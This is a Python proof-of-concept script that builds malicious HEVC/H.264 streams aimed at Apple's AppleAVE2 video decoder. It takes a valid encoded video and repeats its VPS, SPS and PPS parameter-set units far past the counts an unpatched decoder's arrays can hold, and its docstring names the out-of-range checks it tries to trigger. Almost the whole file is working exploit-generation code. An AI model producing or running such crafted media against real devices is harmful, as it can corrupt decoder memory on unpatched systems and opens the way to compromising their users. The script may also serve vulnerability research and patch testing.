#!/usr/bin/env python3
"""
ave_paramset_real.py — PoC generator built on REAL, VALID parameter sets.

Why the previous generator failed:
  The earlier ave_paramset_oob.py hand-constructed VPS/SPS/PPS payloads.
  They were structurally invalid (ffprobe: "vps_reserved_ffff_16bits is not
  0xffff", "VPS 0 does not exist"). VideoToolbox rejected them at the very
  first parse, so AppleAVE2 never reached the array-fill path where the
  count checks live. "No rejections logged" was the symptom.

What this does instead:
  1. Take a real stream produced by libx265 (or libx264).
  2. Parse its Annex-B NAL units.
  3. Emit a stream that repeats the VALID parameter-set NAL units many times.
     The NALs are byte-for-byte valid, so the decoder parses each one fully;
     only the total COUNT exceeds what the pre-fix array can hold.

CONFIRMED target messages (from the 27.2 AppleAVE2 string diff):
    "HEVC PPS count is out of range %d %d %d %d %d %d"
    "HEVC SPS count is out of range %d %d %d %d %d"
    "HEVC VPS count is out of range %d %d %d %d %d %d"
    "HEVC RPS count is out of range %d %d %d %d"
    "AVC PPS count is out of range %d %d %d %d"
    "too many parameter sets ..."

Usage:
  python3 ave_paramset_real.py <real.hevc|real.h264> <mode> [count]
  modes: vps | sps | pps | all | rps
  default count: 64 for VPS/SPS/RPS, 256 for PPS
  Output goes to stdout (raw Annex-B stream).
"""

import sys

HEVC_PARAM_TYPES = {32: "VPS", 33: "SPS", 34: "PPS"}
AVC_PARAM_TYPES  = {7: "SPS", 8: "PPS"}


def split_annexb(data: bytes):
    """Split an Annex-B byte stream into NAL units (without start codes)."""
    nals = []
    i = 0
    n = len(data)
    starts = []
    while i < n - 3:
        if data[i] == 0 and data[i+1] == 0 and data[i+2] == 1:
            starts.append(i + 3)
            i += 3
        elif data[i] == 0 and data[i+1] == 0 and data[i+2] == 0 and data[i+3] == 1:
            starts.append(i + 4)
            i += 4
        else:
            i += 1
    for idx, s in enumerate(starts):
        e = starts[idx+1] - 3 if idx+1 < len(starts) else n
        # trim trailing zero of the next start code
        while e > s and data[e-1] == 0 and (idx+1 < len(starts)):
            e -= 1
        nals.append(data[s:e])
    return nals


def hevc_nal_type(nal: bytes) -> int:
    if len(nal) < 2:
        return -1
    return (nal[0] >> 1) & 0x3F


def avc_nal_type(nal: bytes) -> int:
    if len(nal) < 1:
        return -1
    return nal[0] & 0x1F


def is_hevc(nals) -> bool:
    if not nals:
        return False
    # HEVC NAL header is 2 bytes; VPS(32)/SPS(33)/PPS(34) only exist in HEVC.
    types = {hevc_nal_type(n) for n in nals}
    return bool(types & {32, 33, 34})


def start_code() -> bytes:
    return b"\x00\x00\x00\x01"


def build(nals, mode: str, count: int, hevc: bool) -> bytes:
    param_types = HEVC_PARAM_TYPES if hevc else AVC_PARAM_TYPES
    by_name = {}
    others = []
    for n in nals:
        t = hevc_nal_type(n) if hevc else avc_nal_type(n)
        name = param_types.get(t)
        if name:
            by_name.setdefault(name, n)
        else:
            others.append(n)

    if mode == "all":
        order = ["VPS", "SPS", "PPS"] if hevc else ["SPS", "PPS"]
    elif mode.upper() in by_name:
        order = [mode.upper()]
    else:
        order = list(by_name.keys())

    out = bytearray()
    # Always emit the parameter sets in dependency order first.
    for name in (["VPS", "SPS", "PPS"] if hevc else ["SPS", "PPS"]):
        if name in by_name:
            out += start_code() + by_name[name]

    # Now flood with the requested type, using the VALID bytes each time.
    for name in order:
        if name not in by_name:
            continue
        nal = by_name[name]
        for _ in range(count):
            out += start_code() + nal

    # Append the remaining (slice) NALs so the decoder proceeds to setup.
    for n in others:
        out += start_code() + n
    return bytes(out)


def main():
    if len(sys.argv) < 3:
        sys.stderr.write(__doc__)
        return 2
    path, mode = sys.argv[1], sys.argv[2]
    count = int(sys.argv[3]) if len(sys.argv) > 3 else None

    data = open(path, "rb").read()
    nals = split_annexb(data)
    if not nals:
        sys.stderr.write("no NAL units found in %s\n" % path)
        return 1

    hevc = is_hevc(nals)
    types = sorted({(hevc_nal_type(n) if hevc else avc_nal_type(n)) for n in nals})
    sys.stderr.write("stream: %s  nals=%d  hevc=%s  types=%s\n" %
                     (path, len(nals), hevc, types))

    if count is None:
        count = 256 if mode.lower() == "pps" else 64

    out = build(nals, mode, count, hevc)
    sys.stderr.write("mode=%s count=%d -> %d bytes\n" % (mode, count, len(out)))
    sys.stdout.buffer.write(out)
    return 0


if __name__ == "__main__":
    sys.exit(main())
